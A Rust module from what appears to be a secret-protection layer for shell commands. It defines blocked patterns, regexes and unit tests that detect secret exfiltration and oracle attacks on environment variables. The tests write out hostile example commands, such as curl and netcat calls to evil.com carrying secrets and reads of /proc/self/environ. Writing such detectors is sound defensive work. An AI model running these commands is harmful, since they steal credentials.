//! Blocked pattern definitions for oracle attack prevention.
//!
//! This module defines patterns that indicate potential secret exfiltration
//! attempts or oracle attacks. Patterns are categorized by attack type.
//!
//! # Pattern Categories
//!
//! - **SUBSTRING_EXTRACTION**: Character-by-character secret extraction
//! - **CONDITIONAL_TESTING**: Testing secret values via conditionals
//! - **ENCODING_EXFILTRATION**: Encoding and sending secrets
//! - **DIRECT_ACCESS**: Direct environment/process access
//! - **WRITE_TO_FILE**: Writing secrets to accessible files

use crate::parser::{ParsedCommand, RedirectKind};
use lazy_static::lazy_static;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

/// Categories of blocked patterns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PatternCategory {
    /// Substring/character extraction from secrets.
    SubstringExtraction,
    /// Conditional testing of secret values.
    ConditionalTesting,
    /// Encoding secrets for exfiltration.
    EncodingExfiltration,
    /// Direct access to environment/process info.
    DirectAccess,
    /// Writing secrets to files.
    WriteToFile,
    /// Network exfiltration of secrets.
    NetworkExfiltration,
    /// Timing-based oracle attacks.
    TimingOracle,
}

impl std::fmt::Display for PatternCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SubstringExtraction => write!(f, "SUBSTRING_EXTRACTION"),
            Self::ConditionalTesting => write!(f, "CONDITIONAL_TESTING"),
            Self::EncodingExfiltration => write!(f, "ENCODING_EXFILTRATION"),
            Self::DirectAccess => write!(f, "DIRECT_ACCESS"),
            Self::WriteToFile => write!(f, "WRITE_TO_FILE"),
            Self::NetworkExfiltration => write!(f, "NETWORK_EXFILTRATION"),
            Self::TimingOracle => write!(f, "TIMING_ORACLE"),
        }
    }
}

/// A detected pattern match.
#[derive(Debug, Clone)]
pub struct PatternMatch {
    /// The pattern that matched.
    pub pattern: &'static BlockedPattern,
    /// The matched text or location.
    pub matched_text: String,
    /// Variables involved in the match.
    pub involved_variables: Vec<String>,
    /// Additional context about the match.
    pub context: Option<String>,
}

/// A blocked pattern definition.
#[derive(Debug, Clone)]
pub struct BlockedPattern {
    /// Unique identifier.
    pub id: &'static str,
    /// Category of attack.
    pub category: PatternCategory,
    /// Human-readable description.
    pub description: &'static str,
    /// Severity (0.0-1.0).
    pub severity: f64,
    /// Whether this pattern can be overridden by policy.
    pub overridable: bool,
}

lazy_static! {
    // ============================================
    // SUBSTRING EXTRACTION PATTERNS
    // ============================================

    /// Bash substring extraction ${VAR:N:M}
    static ref PAT_BASH_SUBSTRING: BlockedPattern = BlockedPattern {
        id: "SUBSTR_BASH",
        category: PatternCategory::SubstringExtraction,
        description: "Bash substring extraction ${VAR:offset:length} can extract secrets character by character",
        severity: 1.0,
        overridable: false,
    };

    /// cut command on variable
    static ref PAT_CUT_CHAR: BlockedPattern = BlockedPattern {
        id: "SUBSTR_CUT",
        category: PatternCategory::SubstringExtraction,
        description: "cut command can extract specific characters from secrets",
        severity: 0.9,
        overridable: false,
    };

    /// awk substr on variable
    static ref PAT_AWK_SUBSTR: BlockedPattern = BlockedPattern {
        id: "SUBSTR_AWK",
        category: PatternCategory::SubstringExtraction,
        description: "awk substr() can extract specific characters from secrets",
        severity: 0.9,
        overridable: false,
    };

    /// sed character extraction
    static ref PAT_SED_CHAR: BlockedPattern = BlockedPattern {
        id: "SUBSTR_SED",
        category: PatternCategory::SubstringExtraction,
        description: "sed can be used to extract specific characters from secrets",
        severity: 0.9,
        overridable: false,
    };

    /// Python one-liner accessing env
    static ref PAT_PYTHON_ENV: BlockedPattern = BlockedPattern {
        id: "SUBSTR_PYTHON",
        category: PatternCategory::SubstringExtraction,
        description: "Python can access and slice environment variables",
        severity: 0.9,
        overridable: true,
    };

    /// Node one-liner accessing env
    static ref PAT_NODE_ENV: BlockedPattern = BlockedPattern {
        id: "SUBSTR_NODE",
        category: PatternCategory::SubstringExtraction,
        description: "Node.js can access and slice environment variables",
        severity: 0.9,
        overridable: true,
    };

    /// Ruby one-liner accessing env
    static ref PAT_RUBY_ENV: BlockedPattern = BlockedPattern {
        id: "SUBSTR_RUBY",
        category: PatternCategory::SubstringExtraction,
        description: "Ruby can access and slice environment variables",
        severity: 0.9,
        overridable: true,
    };

    /// Perl one-liner accessing env
    static ref PAT_PERL_ENV: BlockedPattern = BlockedPattern {
        id: "SUBSTR_PERL",
        category: PatternCategory::SubstringExtraction,
        description: "Perl can access and slice environment variables",
        severity: 0.9,
        overridable: true,
    };

    // ============================================
    // CONDITIONAL TESTING PATTERNS
    // ============================================

    /// if/test comparing env var
    static ref PAT_COND_TEST: BlockedPattern = BlockedPattern {
        id: "COND_TEST",
        category: PatternCategory::ConditionalTesting,
        description: "Conditional testing of secret values enables oracle attacks",
        severity: 1.0,
        overridable: false,
    };

    /// case statement on env var
    static ref PAT_COND_CASE: BlockedPattern = BlockedPattern {
        id: "COND_CASE",
        category: PatternCategory::ConditionalTesting,
        description: "Case statement on secrets enables oracle attacks",
        severity: 1.0,
        overridable: false,
    };

    /// grep/awk pattern matching on env var
    static ref PAT_GREP_MATCH: BlockedPattern = BlockedPattern {
        id: "COND_GREP",
        category: PatternCategory::ConditionalTesting,
        description: "Pattern matching on secrets can leak information via exit codes",
        severity: 0.8,
        overridable: true,
    };

    // ============================================
    // ENCODING EXFILTRATION PATTERNS
    // ============================================

    /// base64 encoding of env var
    static ref PAT_BASE64: BlockedPattern = BlockedPattern {
        id: "ENCODE_BASE64",
        category: PatternCategory::EncodingExfiltration,
        description: "Base64 encoding of secrets facilitates exfiltration",
        severity: 0.9,
        overridable: false,
    };

    /// xxd/hexdump of env var
    static ref PAT_HEX_DUMP: BlockedPattern = BlockedPattern {
        id: "ENCODE_HEX",
        category: PatternCategory::EncodingExfiltration,
        description: "Hex encoding of secrets facilitates exfiltration",
        severity: 0.9,
        overridable: false,
    };

    /// od (octal dump) of env var
    static ref PAT_OCTAL_DUMP: BlockedPattern = BlockedPattern {
        id: "ENCODE_OCTAL",
        category: PatternCategory::EncodingExfiltration,
        description: "Octal dump of secrets facilitates exfiltration",
        severity: 0.9,
        overridable: false,
    };

    /// curl/wget with env var in URL
    static ref PAT_CURL_URL: BlockedPattern = BlockedPattern {
        id: "EXFIL_CURL_URL",
        category: PatternCategory::NetworkExfiltration,
        description: "Secret in URL path or query string enables network exfiltration",
        severity: 1.0,
        overridable: false,
    };

    /// DNS exfiltration via dig/nslookup
    static ref PAT_DNS_EXFIL: BlockedPattern = BlockedPattern {
        id: "EXFIL_DNS",
        category: PatternCategory::NetworkExfiltration,
        description: "Secret in DNS query enables exfiltration via DNS",
        severity: 1.0,
        overridable: false,
    };

    /// nc/netcat with env var
    static ref PAT_NETCAT: BlockedPattern = BlockedPattern {
        id: "EXFIL_NETCAT",
        category: PatternCategory::NetworkExfiltration,
        description: "Netcat can exfiltrate secrets over network",
        severity: 1.0,
        overridable: false,
    };

    // ============================================
    // DIRECT ACCESS PATTERNS
    // ============================================

    /// printenv/env command
    static ref PAT_PRINTENV: BlockedPattern = BlockedPattern {
        id: "DIRECT_PRINTENV",
        category: PatternCategory::DirectAccess,
        description: "printenv/env lists all environment variables including secrets",
        severity: 1.0,
        overridable: false,
    };

    /// export command (listing)
    static ref PAT_EXPORT_LIST: BlockedPattern = BlockedPattern {
        id: "DIRECT_EXPORT",
        category: PatternCategory::DirectAccess,
        description: "export without arguments lists all exported variables",
        severity: 0.9,
        overridable: true,
    };

    /// /proc/self/environ access
    static ref PAT_PROC_ENVIRON: BlockedPattern = BlockedPattern {
        id: "DIRECT_PROC_ENVIRON",
        category: PatternCategory::DirectAccess,
        description: "Reading /proc/*/environ exposes all environment variables",
        severity: 1.0,
        overridable: false,
    };

    /// ps eww (shows env in process list)
    static ref PAT_PS_ENV: BlockedPattern = BlockedPattern {
        id: "DIRECT_PS_ENV",
        category: PatternCategory::DirectAccess,
        description: "ps with environment flags can expose secrets",
        severity: 0.9,
        overridable: false,
    };

    /// set command (shows all vars)
    static ref PAT_SET_CMD: BlockedPattern = BlockedPattern {
        id: "DIRECT_SET",
        category: PatternCategory::DirectAccess,
        description: "set command shows all shell variables",
        severity: 0.8,
        overridable: true,
    };

    // ============================================
    // WRITE TO FILE PATTERNS
    // ============================================

    /// Redirecting env var to file
    static ref PAT_REDIRECT_FILE: BlockedPattern = BlockedPattern {
        id: "WRITE_REDIRECT",
        category: PatternCategory::WriteToFile,
        description: "Redirecting secret to file can expose it",
        severity: 0.8,
        overridable: true,
    };

    /// Writing to world-readable location
    static ref PAT_WRITE_TMP: BlockedPattern = BlockedPattern {
        id: "WRITE_TMP",
        category: PatternCategory::WriteToFile,
        description: "Writing secrets to /tmp or world-readable locations",
        severity: 0.9,
        overridable: false,
    };

    // ============================================
    // TIMING ORACLE PATTERNS
    // ============================================

    /// sleep in conditional
    static ref PAT_TIMING_SLEEP: BlockedPattern = BlockedPattern {
        id: "TIMING_SLEEP",
        category: PatternCategory::TimingOracle,
        description: "Sleep in conditional enables timing oracle attacks",
        severity: 1.0,
        overridable: false,
    };

    // ============================================
    // REGEX PATTERNS
    // ============================================

    /// Regex for cut character extraction
    static ref RE_CUT_CHAR: Regex = Regex::new(r"cut\s+(-[cdf]|--characters|--fields|--delimiter)").unwrap();

    /// Regex for awk substr
    static ref RE_AWK_SUBSTR: Regex = Regex::new(r"awk\s+.*substr").unwrap();

    /// Regex for sed character extraction
    static ref RE_SED_CHAR: Regex = Regex::new(r#"sed\s+.*(['"])?s/.*/"#).unwrap();

    /// Regex for base64 command
    static ref RE_BASE64: Regex = Regex::new(r"\bbase64\b").unwrap();

    /// Regex for xxd/hexdump
    static ref RE_HEX: Regex = Regex::new(r"\b(xxd|hexdump|od)\b").unwrap();

    /// Regex for curl/wget with variable in URL
    static ref RE_CURL_URL: Regex = Regex::new(r"(curl|wget)\s+[^|;]*\$").unwrap();

    /// Regex for DNS exfiltration
    static ref RE_DNS: Regex = Regex::new(r"\b(dig|nslookup|host)\b[^|;]*\$").unwrap();

    /// Regex for netcat
    static ref RE_NETCAT: Regex = Regex::new(r"\b(nc|netcat|ncat)\b").unwrap();

    /// Regex for printenv/env
    static ref RE_PRINTENV: Regex = Regex::new(r"\b(printenv|env)\s*($|[|;>&])").unwrap();

    /// Regex for /proc environ
    static ref RE_PROC_ENVIRON: Regex = Regex::new(r"/proc/(self|\d+)/environ").unwrap();

    /// Regex for ps with env
    static ref RE_PS_ENV: Regex = Regex::new(r"\bps\b.*\b([eE]|eww|auxwe)\b").unwrap();

    /// Regex for python env access
    static ref RE_PYTHON_ENV: Regex = Regex::new(r"python[23]?\s+(-c|.*\.py).*os\.environ").unwrap();

    /// Regex for node env access
    static ref RE_NODE_ENV: Regex = Regex::new(r"node\s+(-e|--eval).*process\.env").unwrap();

    /// Regex for ruby env access
    static ref RE_RUBY_ENV: Regex = Regex::new(r"ruby\s+(-e).*ENV\[").unwrap();

    /// Regex for perl env access
    static ref RE_PERL_ENV: Regex = Regex::new(r"perl\s+(-e).*\$ENV\{").unwrap();

    /// Known safe commands that can use secrets
    static ref SAFE_COMMANDS: HashSet<&'static str> = {
        let mut s = HashSet::new();
        // Database clients
        s.insert("psql");
        s.insert("mysql");
        s.insert("mongosh");
        s.insert("redis-cli");
        // Cloud CLIs
        s.insert("aws");
        s.insert("gcloud");
        s.insert("az");
        s.insert("railway");
        s.insert("heroku");
        s.insert("fly");
        s.insert("vercel");
        // Package managers / build tools
        s.insert("npm");
        s.insert("yarn");
        s.insert("pnpm");
        s.insert("cargo");
        s.insert("pip");
        s.insert("poetry");
        // Version control
        s.insert("git");
        s.insert("gh");
        // Containers
        s.insert("docker");
        s.insert("docker-compose");
        s.insert("kubectl");
        s.insert("helm");
        s
    };
}

/// Pattern registry and matcher.
pub struct PatternMatcher {
    /// Variables that are considered secrets.
    secret_variables: HashSet<String>,
    /// Allowed domains for network access.
    allowed_domains: HashSet<String>,
}

impl PatternMatcher {
    /// Create a new pattern matcher.
    pub fn new() -> Self {
        Self {
            secret_variables: HashSet::new(),
            allowed_domains: HashSet::new(),
        }
    }

    /// Register a variable as a secret.
    pub fn add_secret_variable(&mut self, name: &str) {
        self.secret_variables.insert(name.to_string());
    }

    /// Add an allowed domain for network access.
    pub fn add_allowed_domain(&mut self, domain: &str) {
        self.allowed_domains.insert(domain.to_string());
    }

    /// Check if a variable is a secret.
    pub fn is_secret_variable(&self, name: &str) -> bool {
        self.secret_variables.contains(name)
    }

    /// Analyze a parsed command for blocked patterns.
    pub fn analyze(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        // Check for substring extraction
        matches.extend(self.check_substring_extraction(parsed));

        // Check for conditional testing
        matches.extend(self.check_conditional_testing(parsed));

        // Check for encoding/exfiltration
        matches.extend(self.check_encoding_exfiltration(parsed));

        // Check for direct access
        matches.extend(self.check_direct_access(parsed));

        // Check for write to file
        matches.extend(self.check_write_to_file(parsed));

        // Check for network exfiltration
        matches.extend(self.check_network_exfiltration(parsed));

        // Check for timing oracle
        matches.extend(self.check_timing_oracle(parsed));

        matches
    }

    /// Check for substring extraction patterns.
    fn check_substring_extraction(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check bash substring ${VAR:N:M}
        for var_ref in &parsed.variable_refs {
            if var_ref.is_substring && self.is_secret_or_any(&var_ref.name) {
                matches.push(PatternMatch {
                    pattern: &PAT_BASH_SUBSTRING,
                    matched_text: var_ref.full_ref.clone(),
                    involved_variables: vec![var_ref.name.clone()],
                    context: Some(format!(
                        "Extracts characters at offset {:?} with length {:?}",
                        var_ref.offset, var_ref.length
                    )),
                });
            }
        }

        // Check cut command
        if RE_CUT_CHAR.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_CUT_CHAR,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        // Check awk substr
        if RE_AWK_SUBSTR.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_AWK_SUBSTR,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        // Check sed extraction
        if RE_SED_CHAR.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_SED_CHAR,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        // Check Python env access
        if RE_PYTHON_ENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_PYTHON_ENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: Some("Python can access and manipulate environment variables".to_string()),
            });
        }

        // Check Node env access
        if RE_NODE_ENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_NODE_ENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: Some("Node.js can access and manipulate environment variables".to_string()),
            });
        }

        // Check Ruby env access
        if RE_RUBY_ENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_RUBY_ENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: Some("Ruby can access and manipulate environment variables".to_string()),
            });
        }

        // Check Perl env access
        if RE_PERL_ENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_PERL_ENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: Some("Perl can access and manipulate environment variables".to_string()),
            });
        }

        matches
    }

    /// Check for conditional testing patterns.
    fn check_conditional_testing(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check for conditionals with secret variables
        if parsed.has_conditionals {
            let secret_vars = self.get_secret_variables(parsed);
            if !secret_vars.is_empty() {
                // Check if it's comparing against secret value
                let is_comparing = cmd.contains('=') || cmd.contains("-eq")
                    || cmd.contains("-ne") || cmd.contains("-lt")
                    || cmd.contains("-gt") || cmd.contains("==")
                    || cmd.contains("!=");

                if is_comparing {
                    matches.push(PatternMatch {
                        pattern: &PAT_COND_TEST,
                        matched_text: cmd.to_string(),
                        involved_variables: secret_vars,
                        context: Some("Conditional comparison of secret values enables oracle attacks".to_string()),
                    });
                }
            }
        }

        // Check for case statements on secrets
        if cmd.contains("case") && cmd.contains("esac") {
            let secret_vars = self.get_secret_variables(parsed);
            if !secret_vars.is_empty() {
                matches.push(PatternMatch {
                    pattern: &PAT_COND_CASE,
                    matched_text: cmd.to_string(),
                    involved_variables: secret_vars,
                    context: None,
                });
            }
        }

        // Check for grep/awk pattern matching with exit code
        if parsed.has_pipes {
            let has_grep_awk = parsed.commands.iter().any(|c| c == "grep" || c == "awk");
            if has_grep_awk && !self.get_secret_variables(parsed).is_empty() {
                // Only flag if combined with conditionals or exit code checking
                if cmd.contains("$?") || cmd.contains("&&") || cmd.contains("||") {
                    matches.push(PatternMatch {
                        pattern: &PAT_GREP_MATCH,
                        matched_text: cmd.to_string(),
                        involved_variables: self.get_secret_variables(parsed),
                        context: Some("Exit code from grep/awk can leak information about secret content".to_string()),
                    });
                }
            }
        }

        matches
    }

    /// Check for encoding/exfiltration patterns.
    fn check_encoding_exfiltration(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check base64 with secrets
        if RE_BASE64.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_BASE64,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        // Check hex dump with secrets
        if RE_HEX.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_HEX_DUMP,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        matches
    }

    /// Check for direct access patterns.
    fn check_direct_access(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check printenv/env
        if RE_PRINTENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_PRINTENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: None,
            });
        }

        // Check /proc/*/environ
        if RE_PROC_ENVIRON.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_PROC_ENVIRON,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: None,
            });
        }

        // Check ps with env flags
        if RE_PS_ENV.is_match(cmd) {
            matches.push(PatternMatch {
                pattern: &PAT_PS_ENV,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: None,
            });
        }

        // Check bare export command
        if cmd.trim() == "export" || cmd.contains("export;") || cmd.contains("export |") {
            matches.push(PatternMatch {
                pattern: &PAT_EXPORT_LIST,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: None,
            });
        }

        // Check set command
        if cmd.trim() == "set" || (cmd.starts_with("set") && !cmd.contains('=')) {
            matches.push(PatternMatch {
                pattern: &PAT_SET_CMD,
                matched_text: cmd.to_string(),
                involved_variables: vec![],
                context: None,
            });
        }

        matches
    }

    /// Check for write-to-file patterns.
    fn check_write_to_file(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();

        // Check redirections with secret variables
        if !parsed.redirections.is_empty() && !self.get_secret_variables(parsed).is_empty() {
            for redir in &parsed.redirections {
                if redir.kind == RedirectKind::Output || redir.kind == RedirectKind::Append {
                    // Check if writing to tmp or world-readable location
                    if redir.target.starts_with("/tmp")
                        || redir.target.starts_with("/var/tmp")
                        || redir.target.starts_with("/dev/shm")
                    {
                        matches.push(PatternMatch {
                            pattern: &PAT_WRITE_TMP,
                            matched_text: format!("Redirect to {}", redir.target),
                            involved_variables: self.get_secret_variables(parsed),
                            context: None,
                        });
                    } else {
                        matches.push(PatternMatch {
                            pattern: &PAT_REDIRECT_FILE,
                            matched_text: format!("Redirect to {}", redir.target),
                            involved_variables: self.get_secret_variables(parsed),
                            context: None,
                        });
                    }
                }
            }
        }

        matches
    }

    /// Check for network exfiltration patterns.
    fn check_network_exfiltration(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check curl/wget with variable in URL
        if RE_CURL_URL.is_match(cmd) {
            let secret_vars = self.get_secret_variables(parsed);
            if !secret_vars.is_empty() {
                // Check if the URL domain is allowed
                let is_allowed = self.check_url_domain_allowed(cmd);

                if !is_allowed {
                    matches.push(PatternMatch {
                        pattern: &PAT_CURL_URL,
                        matched_text: cmd.to_string(),
                        involved_variables: secret_vars,
                        context: Some("Secret variable in URL path or query string".to_string()),
                    });
                }
            }
        }

        // Check DNS exfiltration
        if RE_DNS.is_match(cmd) && !self.get_secret_variables(parsed).is_empty() {
            matches.push(PatternMatch {
                pattern: &PAT_DNS_EXFIL,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        // Check netcat
        if RE_NETCAT.is_match(cmd) && self.has_secret_piped(parsed) {
            matches.push(PatternMatch {
                pattern: &PAT_NETCAT,
                matched_text: cmd.to_string(),
                involved_variables: self.get_secret_variables(parsed),
                context: None,
            });
        }

        matches
    }

    /// Check for timing oracle patterns.
    fn check_timing_oracle(&self, parsed: &ParsedCommand) -> Vec<PatternMatch> {
        let mut matches = Vec::new();
        let cmd = &parsed.raw;

        // Check for sleep in conditionals
        if parsed.has_conditionals && cmd.contains("sleep") {
            let secret_vars = self.get_secret_variables(parsed);
            if !secret_vars.is_empty() {
                matches.push(PatternMatch {
                    pattern: &PAT_TIMING_SLEEP,
                    matched_text: cmd.to_string(),
                    involved_variables: secret_vars,
                    context: Some("Sleep in conditional with secret enables timing oracle".to_string()),
                });
            }
        }

        matches
    }

    /// Check if a variable is a secret or if we should check all variables.
    fn is_secret_or_any(&self, name: &str) -> bool {
        self.secret_variables.is_empty() || self.secret_variables.contains(name)
    }

    /// Check if any secret variable is piped.
    fn has_secret_piped(&self, parsed: &ParsedCommand) -> bool {
        if !parsed.has_pipes {
            return false;
        }

        // Check if echo $VAR or similar comes before a pipe
        let cmd = &parsed.raw;
        for var in &parsed.variable_refs {
            if self.is_secret_or_any(&var.name) {
                // Simple heuristic: variable appears before a pipe
                if let Some(pipe_pos) = cmd.find('|') {
                    if let Some(var_pos) = cmd.find(&var.full_ref) {
                        if var_pos < pipe_pos {
                            return true;
                        }
                    }
                }
            }
        }

        false
    }

    /// Get list of secret variables in the command.
    fn get_secret_variables(&self, parsed: &ParsedCommand) -> Vec<String> {
        parsed
            .variable_refs
            .iter()
            .filter(|v| self.is_secret_or_any(&v.name))
            .map(|v| v.name.clone())
            .collect()
    }

    /// Check if URL domain in command is allowed.
    fn check_url_domain_allowed(&self, cmd: &str) -> bool {
        // Extract URL from curl/wget command
        let url_regex = Regex::new(r"https?://([a-zA-Z0-9.-]+)").unwrap();

        if let Some(caps) = url_regex.captures(cmd) {
            if let Some(domain) = caps.get(1) {
                let domain_str = domain.as_str();
                // Check if domain or any parent domain is allowed
                return self.allowed_domains.iter().any(|allowed| {
                    domain_str == *allowed || domain_str.ends_with(&format!(".{}", allowed))
                });
            }
        }

        false
    }

    /// Check if a command is in the safe commands list.
    pub fn is_safe_command(&self, command: &str) -> bool {
        SAFE_COMMANDS.contains(command)
    }
}

impl Default for PatternMatcher {
    fn default() -> Self {
        Self::new()
    }
}

/// Get the severity of a pattern by ID.
pub fn get_pattern_severity(pattern_id: &str) -> f64 {
    match pattern_id {
        "SUBSTR_BASH" => PAT_BASH_SUBSTRING.severity,
        "SUBSTR_CUT" => PAT_CUT_CHAR.severity,
        "COND_TEST" => PAT_COND_TEST.severity,
        "ENCODE_BASE64" => PAT_BASE64.severity,
        "EXFIL_CURL_URL" => PAT_CURL_URL.severity,
        "DIRECT_PRINTENV" => PAT_PRINTENV.severity,
        "DIRECT_PROC_ENVIRON" => PAT_PROC_ENVIRON.severity,
        "TIMING_SLEEP" => PAT_TIMING_SLEEP.severity,
        _ => 0.5,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::ShellParser;

    fn analyze(cmd: &str, secrets: &[&str]) -> Vec<PatternMatch> {
        let parser = ShellParser::new();
        let mut matcher = PatternMatcher::new();
        for s in secrets {
            matcher.add_secret_variable(s);
        }
        let parsed = parser.parse(cmd).unwrap();
        matcher.analyze(&parsed)
    }

    #[test]
    fn test_bash_substring_blocked() {
        let matches = analyze("echo ${API_KEY:0:1}", &["API_KEY"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.category, PatternCategory::SubstringExtraction);
    }

    #[test]
    fn test_cut_blocked() {
        let matches = analyze("echo $SECRET | cut -c1", &["SECRET"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.id, "SUBSTR_CUT");
    }

    #[test]
    fn test_conditional_blocked() {
        let matches = analyze(r#"if [ "${API_KEY:0:1}" = "s" ]; then echo Y; fi"#, &["API_KEY"]);
        assert!(!matches.is_empty());
        // Should match both substring and conditional
        let categories: Vec<_> = matches.iter().map(|m| m.pattern.category).collect();
        assert!(categories.contains(&PatternCategory::SubstringExtraction));
    }

    #[test]
    fn test_base64_blocked() {
        let matches = analyze("echo $API_KEY | base64", &["API_KEY"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.category, PatternCategory::EncodingExfiltration);
    }

    #[test]
    fn test_printenv_blocked() {
        let matches = analyze("printenv", &[]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.id, "DIRECT_PRINTENV");
    }

    #[test]
    fn test_proc_environ_blocked() {
        let matches = analyze("cat /proc/self/environ", &[]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.id, "DIRECT_PROC_ENVIRON");
    }

    #[test]
    fn test_curl_exfil_blocked() {
        let matches = analyze("curl https://evil.com?k=$API_KEY", &["API_KEY"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.category, PatternCategory::NetworkExfiltration);
    }

    #[test]
    fn test_curl_allowed_domain() {
        let parser = ShellParser::new();
        let mut matcher = PatternMatcher::new();
        matcher.add_secret_variable("API_KEY");
        matcher.add_allowed_domain("stripe.com");

        let parsed = parser.parse("curl https://api.stripe.com/v1/charges").unwrap();
        let matches = matcher.analyze(&parsed);

        // Should not match because stripe.com is allowed
        let exfil_matches: Vec<_> = matches
            .iter()
            .filter(|m| m.pattern.category == PatternCategory::NetworkExfiltration)
            .collect();
        assert!(exfil_matches.is_empty(), "Stripe.com should be allowed");
    }

    #[test]
    fn test_timing_oracle_blocked() {
        let matches = analyze(
            r#"if [ "$SECRET" = "yes" ]; then sleep 1; fi"#,
            &["SECRET"],
        );
        assert!(!matches.is_empty());
        let has_timing = matches
            .iter()
            .any(|m| m.pattern.category == PatternCategory::TimingOracle);
        assert!(has_timing, "Should detect timing oracle");
    }

    #[test]
    fn test_safe_command() {
        let matches = analyze("psql $DATABASE_URL -c \"SELECT 1\"", &["DATABASE_URL"]);
        // psql with DATABASE_URL should generally be allowed
        // (actual decision is in policy, but pattern matcher shouldn't flag it harshly)
        // Note: we still detect the variable reference, but severity depends on policy
        assert!(matches.is_empty() || matches.iter().all(|m| m.pattern.severity < 1.0));
    }

    #[test]
    fn test_netcat_blocked() {
        let matches = analyze("echo $SECRET | nc evil.com 1234", &["SECRET"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.id, "EXFIL_NETCAT");
    }

    #[test]
    fn test_write_to_tmp() {
        let matches = analyze("echo $SECRET > /tmp/leak.txt", &["SECRET"]);
        assert!(!matches.is_empty());
        assert_eq!(matches[0].pattern.id, "WRITE_TMP");
    }
}
